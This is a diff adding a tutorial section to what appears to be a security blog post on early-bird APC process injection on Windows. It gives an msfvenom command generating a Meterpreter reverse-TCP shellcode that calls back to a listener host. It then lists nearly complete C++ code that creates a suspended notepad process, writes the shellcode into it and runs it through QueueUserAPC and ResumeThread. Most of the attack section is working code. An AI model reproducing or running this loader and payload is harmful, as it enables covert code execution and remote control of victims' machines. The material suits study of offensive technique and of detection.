@@ -16,6 +16,164 @@ APC (Asynchronous Procedure Call) on Windows involves threads having `APC queues
 
 As shown in the image above, we first need to create a process, example Notepad.exe, in a `suspended` state. A suspended state allows a process to be opened but interrupts its normal execution. Once the process is opened, we can obtain a handle to it and its threads. We use `VirtualAllocEx` to allocate memory for the code and `WriteProcess` to write our shellcode into that virtual address space. Instead of using `CreateRemoteThreadEx`, we implement `QueueUserAPC` to queue our malicious code as an APC on the main thread of the process. Then, we resume the thread using the `ResumeThread` function. When `ResumeThread` is called, the Windows system starts with the APC queue created, executing our malicious code without executing the main code on the thread.
 
+### Shellcode
+First step would be to generate the shellcode to execute yuor desired command into the process. This can be simple as executing the Calc.exe to basic meterepreter reverse shell to complex and stealth command execution payload that you want. I would love to go through different shellcode techniques and its obfuscation to bypass the defenses but thats for upcoming research plan. Let's stick to the basic meterpreter shellcode as of now.
+
+```bash
+msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe
+```
+
+```c++
+#include <iostream>
+#include <Windows.h>
+
+int main(){
+
+//shellcode
+    unsigned char wannabe[] =
+        "\xfc\x48\x83....[snip]...\xf0\xb5\xa2\x56\xff\xd5";
+```
+
+Once we have our shellcode ready, the next step is to create a new process in a suspended state. As explained earlier, this generally creates the process without execution. **CreateProcess** appears to be a complex function with a variety of arguments, but most of them are optional and can be left at their default values or set to NULL.
+
+```c++
+BOOL CreateProcessA(
+  [in, optional]      LPCSTR                lpApplicationName,
+  [in, out, optional] LPSTR                 lpCommandLine,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  [in]                BOOL                  bInheritHandles,
+  [in]                DWORD                 dwCreationFlags,
+  [in, optional]      LPVOID                lpEnvironment,
+  [in, optional]      LPCSTR                lpCurrentDirectory,
+  [in]                LPSTARTUPINFOA        lpStartupInfo,
+  [out]               LPPROCESS_INFORMATION lpProcessInformation
+);
+```
+- **LPCSTR lpApplicationName**: Contains the path of the executable that needs to be executed.
+- **LPSTR lpCommandLine**: If there are any command line arguments needed for the above executable, pass them here; otherwise, set it to NULL.
+- **LPSECURITY_ATTRIBUTES lpProcessAttributes**: Security attributes that define whether or not the process can be inherited by child processes. Since we do not need that, we can set it to NULL.
+- **LPSECURITY_ATTRIBUTES lpThreadAttributes**: Security attributes that define whether or not the thread can be inherited by child processes. Since we do not need that, we can set it to NULL.
+- **BOOL bInheritHandles**: Boolean variable to define whether or not handles are inherited. Since they are not, set it to FALSE.
+- **DWORD dwCreationFlags**: Variable that controls the priority class while creating the process. Check out the priority classes [here.](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) For a suspended state, the priority class would be CREATE_SUSPENDED.
+- **LPVOID lpEnvironment**: Contains a pointer to the environment block, like ANSI, Unicode, etc. If set to NULL, it will use the same environment as the calling process.
+- **LPCSTR lpCurrentDirectory**: Contains the path to the current directory of the process. Can be set to NULL to allocate the same current directory to the new process as the calling process.
+- **LPSTARTUPINFOA lpStartupInfo**: A pointer to the STARTUPINFO structure, which we will discuss later.
+- **LPPROCESS_INFORMATION lpProcessInformation**: A pointer to the PROCESS_INFORMATION structure, which contains the handles to the process and threads.
+
+
+
+### CreateProcess
+```c++
+// CreateProcess Variables
+STARTUPINFO si = { 0 };
+PROCESS_INFORMATION pi = { 0 };
+si.cb = sizeof(si);
+
+LPCWSTR execFile = L"C:\\Windows\\notepad.exe";
+   
+// CreateProcess in Suspended State
+BOOL bCreateProcess = CreateProcess(execFile, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+if (bCreateProcess == FALSE) {
+    printf("\nError Creating the Process: %d", GetLastError());
+    return;
+}
+
+printf("Successfully created the process in suspended state\n");
+```
+### VirtualAllocEx
+We need to allocate our buffer into the virtual address space of the running process. Before that, we need to allocate/reserve the region of the memory within the virtual address space. This can be done using VirtualAllocEx function of the windows API. I have already described the [same thing here.](https://nirajkharel.com.np/posts/process-injection-shellcode/#buffer-allocation---virtualallocex)
+```c++
+// VritualAllocEx Variables
+LPVOID lpAddress = NULL;
+SIZE_T dwSize = sizeof(wannabe);
+DWORD flAllocationType = (MEM_COMMIT | MEM_RESERVE);
+DWORD flProtect = PAGE_EXECUTE_READWRITE;
+
+LPVOID lpAlloc = VirtualAllocEx(pi.hProcess, lpAddress, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+if (lpAlloc == NULL) {
+    printf("\nError Allocating the memory: %d", GetLastError());
+    return;
+}
+printf("Successfully allocated memory\n");
+```
+
+### WriteProcessMemory
+Once we have allocated our memory into the virtual address space, the next process is to write the buffer (shellcode) into that memory space. This was also disucssed in detail in [earlier blog.](https://nirajkharel.com.np/posts/process-injection-shellcode/#write-buffer-into-the-allocated-memory---writeprocessmemory)
+```c++
+// WriteProcessMemory Variables
+LPVOID lpBaseAddress = lpAlloc;
+LPCVOID lpBuffer = wannabe;
+SIZE_T nSize = sizeof(wannabe);
+SIZE_T lpNumberOfBytesWritten = 0;
+
+BOOL bWrite = WriteProcessMemory(pi.hProcess, lpAlloc, lpBuffer, nSize, &lpNumberOfBytesWritten);
+
+if (bWrite == FALSE) {
+    printf("\nError Writing buffer to memory: %d", GetLastError());
+    return;
+}
+
+printf("Successfully written buffer into the memory\n");
+```
+
+### VirtualProtectEx
+This function is used to change the memory protection options of the allocated address for shellcode from RW (Read and Write) to RX (Read and Execute). If you specify the **PAGE_EXECUTE_READWRITE** option when creating the memory allocation with **VirtualAllocEx**, this function is not needed. The point of using this function here is to follow a generic secure coding process, as memory is not executable until you explicitly change its protection with **VirtualProtectEx**. It's basically like creating a file in read and write mode while writing the content to it, and making it executable when needed, instead of giving read, write, and execute permissions while creating the file.
+
+```c++
+BOOL VirtualProtectEx(
+  [in]  HANDLE hProcess,
+  [in]  LPVOID lpAddress,
+  [in]  SIZE_T dwSize,
+  [in]  DWORD  flNewProtect,
+  [out] PDWORD lpflOldProtect
+);
+```
+- **HANDLE hProcess**: Handle to the process where you want to change the memory protections.
+- **LPVOID lpAddress**: Pointer to the base address of the allocated region. Basically the return type of the `VirtualAllocEx` 
+- **SIZE_T dwSize**: Size of the shellcode. Same size allocated on `WriteProcessMemory`.
+- **DWORD flNewProtect**: Memory protections options to prvoide i.e. PAGE_EXECUTE_READ.
+- **PDWORD lpfOldProtect**: Pointer to the output variable which stores the old protection right instead the protection right needs to be restored after execution.
+
+```c++
+DWORD lpfOldProtect = NULL;
+if (!VirtualProtectEx(pi.hProcess, lpAlloc, nSize, PAGE_EXECUTE_READ, &lpfOldProtect)) {
+    printf("[-] Failed to change memory protection from RW to RX: %d \n", GetLastError());
+    return;
+}
+printf("successfully executed virtual protect");
+```
+
+### QueueUserAPC
+```c++
+DWORD dQueueAPC = QueueUserAPC((PAPCFUNC) lpAlloc, pi.hThread, NULL);
+if (dQueueAPC == 0) {
+    printf("\nError Queueing APC: %d", GetLastError());
+    return;
+}
+Sleep(1000 * 2);
+```
+
+### ResumeThread
+```c++
+// ResumeThread
+DWORD dResumeThread = ResumeThread(pi.hThread);
+if (dResumeThread == (DWORD)-1) {
+    printf("\nError Resuming Thread: %d", GetLastError());
+    return;
+}
+printf("Executing the shellcode");
+```
+
+### CloseHandle
+```c++
+    // Close handles
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+```
+
 <br>
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-queueUserAPC.gif">
 <br>
